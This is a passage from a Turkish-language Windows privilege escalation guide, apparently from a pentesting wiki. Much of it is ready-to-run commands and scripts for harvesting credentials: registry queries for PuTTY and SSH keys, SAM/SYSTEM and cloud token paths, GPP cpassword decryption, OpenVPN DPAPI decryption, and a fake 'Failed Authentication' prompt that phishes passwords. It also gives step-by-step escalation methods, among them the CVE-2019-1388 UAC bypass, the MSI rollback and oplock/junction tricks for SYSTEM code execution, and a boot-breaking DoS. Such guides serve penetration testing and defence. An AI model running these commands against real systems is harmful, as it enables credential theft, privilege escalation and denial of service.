$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Kimlik Bilgileri
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry içindeki SSH anahtarları

SSH private keys, registry anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o yol içinde herhangi bir giriş bulursanız, bu büyük olasılıkla kaydedilmiş bir SSH anahtarıdır. Şifreli olarak saklanır ama [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` servisi çalışmıyorsa ve açılışta otomatik olarak başlatılmasını istiyorsanız şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu technique artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve ssh üzerinden bir makineye giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys registry yok ve procmon asimetrik key authentication sırasında `dpapi.dll` kullanımını tespit etmedi.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları ayrıca **metasploit** ile de arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Cached GPP Pasword

Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesapları dağıtmayı sağlayan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. Birincisi, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebilirdi. İkincisi, bu GPP'ler içindeki, kamuya açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmiş parolalar, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebilirdi. Bu durum ciddi bir risk oluşturuyordu; çünkü kullanıcılara yükseltilmiş yetkiler kazandırabilirdi.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda, fonksiyon parolayı çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içerir; bu da bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` içinde veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ içinde arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'u çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Kullanıcının kendi kimlik bilgilerini ya da başka bir kullanıcının kimlik bilgilerini girmesini **isteyebilirsiniz**, eğer onları bilebileceğini düşünüyorsanız (dikkat edin ki müşteriden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilecek olası dosya adları**

Geçmişte **düz metin** veya **Base64** olarak **parolalar** içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tüm önerilen dosyalarda ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

İçindeki credentials'ları bulmak için Bin'i de kontrol etmelisiniz

Birçok program tarafından kaydedilen **parolaları recover etmek** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Credentials içerebilecek diğer olası registry key'leri**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry'den openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome veya Firefox** içinde saklanan şifrelerin olduğu db'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların history, bookmarks ve favourites kısımlarını da kontrol edin; böylece orada bazı **passwords are** saklanmış olabilir.

Tarayıcılardan şifre çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sistemi içinde yerleşik bir teknolojidir ve farklı dillerdeki yazılım bileşenleri arasında **intercommunication** sağlar. Her COM bileşeni bir **class ID (CLSID)** ile **tanımlanır** ve her bileşen, interface IDs (IIDs) ile tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM class ve interface'leri registry içinde sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlıdır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Bu registry'nin CLSID'leri içinde, bir **DLL**'i işaret eden bir **default value** içeren **InProcServer32** alt registry'sini ve **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral) olabilen **ThreadingModel** adlı bir değeri bulabilirsiniz.

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Temel olarak, yürütülecek herhangi bir **DLL'yi overwrite** edebilirseniz, bu DLL farklı bir kullanıcı tarafından yürütülecekse **privileges escalate** edebilirsiniz.

Saldırganların persistence mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adını arama**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adları ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Şifreleri arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** eklentisidir; bu eklenti, kurban içinde kimlik bilgilerini arayan tüm metasploit POST modüllerini otomatik olarak çalıştırmak için oluşturduğum bir eklentidir.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen şifreleri içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden şifre çıkarmak için kullanılan başka harika bir araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu veriyi düz metin olarak kaydeden birkaç aracın (**PuTTY**, **WinSCP**, **FileZilla**, **SuperPuTTY** ve **RDP**) **oturumlarını**, **kullanıcı adlarını** ve **şifrelerini** arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Diyelim ki **SYSTEM olarak çalışan bir process yeni bir process açıyor** (`OpenProcess()`) **tam erişimle**. Aynı process **ayrıca yeni bir process oluşturuyor** (`CreateProcess()`) **düşük ayrıcalıklarla ama ana processin tüm open handles’larını devralarak**.\
Sonra, **düşük ayrıcalıklı process üzerinde tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **ayrıcalıklı process’e ait open handle’ı** alabilir ve **shellcode inject edebilirsiniz**.\
[Daha fazla bilgi için bu örneği okuyun: **bu vulnerability nasıl tespit edilir ve exploit edilir**.](leaked-handle-exploitation.md)\
[Bu **başka gönderi, farklı izin seviyeleriyle devralınan process ve thread’lerin daha fazla open handler’ını nasıl test edip abuse edeceğinizi** daha kapsamlı açıklar (sadece full access değil)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipes** olarak adlandırılan shared memory segmentleri, process iletişimini ve veri aktarımını sağlar.

Windows, ilişkisiz process’lerin farklı ağlar üzerinden bile veri paylaşmasına izin veren **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** tarafından pipe üzerinden veri gönderildiğinde, pipe’ı kuran **server**, gerekli **SeImpersonate** yetkilerine sahipse **client’ın kimliğini üstlenebilir**. Pipe üzerinden haberleşen ve taklit edebileceğiniz **ayrıcalıklı bir process** bulmak, kurduğunuz pipe ile etkileşime geçtiğinde o process’in kimliğini benimseyerek **daha yüksek ayrıcalıklar kazanma** fırsatı sağlar. Böyle bir attack’ı uygulama talimatları için yardımcı kılavuzları [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulabilirsiniz.

Ayrıca aşağıdaki tool, **named pipe iletişimini burp benzeri bir tool ile intercept etmeyi** sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privescs bulmak için tüm pipe’ları listeleyip görmeyi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode’daki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) sunar. Remote authenticated bir client, mailslot tabanlı async event yolunu abuse ederek `ClientAttach`’i mevcut herhangi bir, `NETWORK SERVICE` tarafından yazılabilir dosyaya **keyfi 4-byte write** yapmaya dönüştürebilir; ardından Telephony admin yetkileri kazanır ve service olarak keyfi bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` writable mevcut bir path olarak ayarlanmış `ClientAttach` → service bunu `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event writes için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext` değerini o handle’a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, sonra deterministic writes’i tekrarlamak için unregister/shutdown yapın.
- Kendinizi `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna ekleyin, yeniden bağlanın, sonra `TSPI_providerUIIdentify`’ı `NETWORK SERVICE` olarak çalıştırmak için keyfi bir DLL path ile `GetUIDllName` çağırın.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta stuff execute edebilecek File Extensions

Şu sayfaya bakın **[https://filesec.io/](https://filesec.io/)**

### Markdown renderers üzerinden Protocol handler / ShellExecute abuse

`ShellExecuteExW`’ye yönlendirilen tıklanabilir Markdown links, tehlikeli URI handler’larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve attacker-controlled dosyaları current user olarak execute edebilir. Bkz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Şifreler için Command Line’ları izleme**

Bir user olarak shell alırken, command line üzerinde credentials pass eden scheduled tasks veya başka process’ler çalışıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line’larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farkları çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processlerden parolaları çalma

## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (console veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde yetkisiz bir kullanıcıdan bir terminal veya "NT\AUTHORITY SYSTEM" gibi herhangi bir başka process çalıştırmak mümkündür.

Bu, aynı vulnerability ile hem ayrıcalıkları yükseltmeyi hem de aynı anda UAC bypass yapmayı mümkün kılar. Ayrıca, hiçbir şey install etmeye gerek yoktur ve süreç sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayınlanmıştır.

Etkilenen bazı sistemler şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu vulnerability'yi exploit etmek için aşağıdaki adımları gerçekleştirmek gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium’den High Integrity Level’a / UAC Bypass

Integrity Levels hakkında **öğrenmek için bunu oku**:


{{#ref}}
integrity-levels.md
{{#endref}}

Sonra **UAC ve UAC bypasses hakkında öğrenmek için bunu oku:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename’den SYSTEM EoP’ye

Bu teknik, [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) anlatılır; exploit code [**burada mevcut**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde, uninstall süreci sırasında meşru dosyaları malicious dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanmaktan oluşur. Bunun için attacker, daha sonra Windows Installer tarafından diğer MSI paketlerinin uninstall sırasında rollback dosyalarını saklamak için kullanılacak `C:\Config.Msi` klasörünü hijack etmekte kullanılacak bir **malicious MSI installer** oluşturmalıdır; bu rollback dosyaları malicious payload içerecek şekilde değiştirilmiş olacaktır.

Özetlenmiş teknik şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` boş bırakılır)**

- Adım 1: MSI'yı yükle
- `TARGETDIR` içinde yazılabilir bir klasöre zararsız bir dosya (ör. `dummy.txt`) kuran bir `.msi` oluştur.
- Installer'ı **"UAC Compliant"** olarak işaretle, böylece bir **non-admin user** çalıştırabilir.
- Install işleminden sonra dosya için açık bir **handle** bırak.

- Adım 2: Uninstall işlemine başla
- Aynı `.msi`'yi uninstall et.
- Uninstall süreci dosyaları `C:\Config.Msi` içine taşımaya ve onları `.rbf` dosyaları (rollback backups) olarak yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu algılamak için açık dosya handle'ını `GetFinalPathNameByHandle` ile **poll** et.

- Adım 3: Custom Senkronizasyon
- `.msi` içinde bir **custom uninstall action (`SyncOnRbfWritten`)** bulunur ve bu:
- `.rbf` yazıldığında sinyal verir.
- Sonra uninstall devam etmeden önce başka bir event üzerinde **wait** eder.

- Adım 4: `.rbf` Silinmesini Engelle
- Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan aç — bu, onun silinmesini **engeller**.
- Sonra uninstall işleminin bitmesi için geri **sinyal ver**.
- Windows Installer `.rbf`'yi silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf`'yi Elle Sil
- Sen (attacker) `.rbf` dosyasını elle sil.
- Artık **`C:\Config.Msi` boştur**, hijack edilmeye hazırdır.

> Bu noktada, **`C:\Config.Msi`'yi silmek için SYSTEM-level arbitrary folder delete vulnerability**'yi tetikle.

2. **Aşama 2 – Rollback Script'lerini Malicious Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi`'yi Weak ACL'lerle Yeniden Oluştur
- `C:\Config.Msi` klasörünü kendin yeniden oluştur.
- **weak DACLs** (ör. Everyone:F) ayarla ve `WRITE_DAC` ile açık bir handle bırak.

- Adım 7: Başka Bir Install Çalıştır
- `.msi`'yi tekrar yükle, şu ayarlarla:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorla hata oluşturan bir variable.
- Bu install, tekrar **rollback** tetiklemek için kullanılacak; rollback `.rbs` ve `.rbf` okur.

- Adım 8: `.rbs` için İzle
- `C:\Config.Msi` içinde yeni bir `.rbs` görünene kadar `ReadDirectoryChangesW` ile izle.
- Dosya adını yakala.

- Adım 9: Rollback Öncesi Senkronizasyon
- `.msi` içinde bir **custom install action (`SyncBeforeRollback`)** bulunur ve bu:
- `.rbs` oluşturulduğunda bir event sinyaller.
- Sonra devam etmeden önce **wait** eder.

- Adım 10: Weak ACL'yi Yeniden Uygula
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` üzerine **strong ACLs**'yi yeniden uygular.
- Ama elinde hâlâ `WRITE_DAC` içeren bir handle olduğu için, **weak ACLs**'yi tekrar uygulayabilirsin.

> ACL'ler **yalnızca handle open edilirken** enforced edilir, bu yüzden klasöre hâlâ yazabilirsin.

- Adım 11: Sahte `.rbs` ve `.rbf` Bırak
- `.rbs` dosyasını, Windows'a şunu söyleyen **sahte bir rollback script** ile overwrite et:
- Senin `.rbf` dosyanı (malicious DLL) **privileged location** içine geri yükle (örn. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- İçinde **malicious SYSTEM-level payload DLL** bulunan sahte `.rbf` dosyanı bırak.

- Adım 12: Rollback'i Tetikle
- Installer devam etsin diye sync event'ini sinyalle.
- Bir **type 19 custom action (`ErrorOut`)**, install'i bilinen bir noktada **bilerek fail** edecek şekilde yapılandırılmıştır.
- Bu, **rollback** sürecinin başlamasına neden olur.

- Adım 13: SYSTEM DLL'ini Kurar
- Windows Installer:
- Senin malicious `.rbs` dosyanı okur.
- Senin `.rbf` DLL'ini hedef konuma kopyalar.
- Artık **SYSTEM-loaded path** içinde malicious DLL'in vardır.

- Son Adım: SYSTEM Code Çalıştır
- Güvenilir bir **auto-elevated binary** çalıştır (ör. DLL'yi yükleyen `osk.exe`).
- **Boom**: Code'un **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename’den SYSTEM EoP’ye

Ana MSI rollback tekniği (bir önceki) bir **tüm klasörü** silebildiğini varsayar (ör. `C:\Config.Msi`). Peki ya vulnerability yalnızca **arbitrary file deletion** sağlıyorsa ?

**NTFS internals**'ı exploit edebilirsin: her klasörün adı verilen gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata**sını saklar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**’ini **silerseniz**, NTFS **tüm klasörü** dosya sisteminden kaldırır.

Bunu şu gibi standart dosya silme API’leri kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API çağırıyor olsanız bile, bu **folder’ın kendisini siler**.

### Folder Contents Delete'ten SYSTEM EoP'ye
Primitive’iniz keyfi files/folders silmeye izin vermiyor ama bir saldırganın kontrolündeki folder’ın **içeriğini** silmeye izin veriyorsa ne olur?

1. Step 1: Yem folder ve file oluşturun
- Create: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Oplock, ayrıcalıklı bir process `file1.txt` silmeye çalıştığında execution’ı **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım: SYSTEM sürecini tetikle (ör. `SilentCleanup`)
- Bu süreç klasörleri tarar (ör. `%TEMP%`) ve içlerindeki içerikleri silmeye çalışır.
- `file1.txt` dosyasına ulaştığında, **oplock tetiklenir** ve kontrolü callback’inize devreder.

4. Adım: Oplock callback içinde – silme işlemini yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
- Bu, `folder1` klasörünü oplock’u bozmadan boşaltır.
- `file1.txt` dosyasını doğrudan silme — bu, oplock’u erken serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**’a dönüştür:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini saklayan NTFS iç akışını hedefler — onu silmek klasörü siler.

5. Adım 5: oplock’u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Keyfi Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin** olarak **keyfi bir klasör oluşturmanı** sağlayan bir primitive'i istismar et — **dosya yazamasan** veya **zayıf izinler ayarlayamasan** bile.

**Kritik bir Windows sürücüsünün** adını taşıyan bir **klasör** (dosya değil) oluştur, örn.:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver’ına karşılık gelir.
- Eğer bunu **önceden bir klasör olarak oluşturursanız**, Windows gerçek driver’ı boot sırasında yükleyemez.
- Ardından Windows, boot sırasında `cng.sys` yüklemeye çalışır.
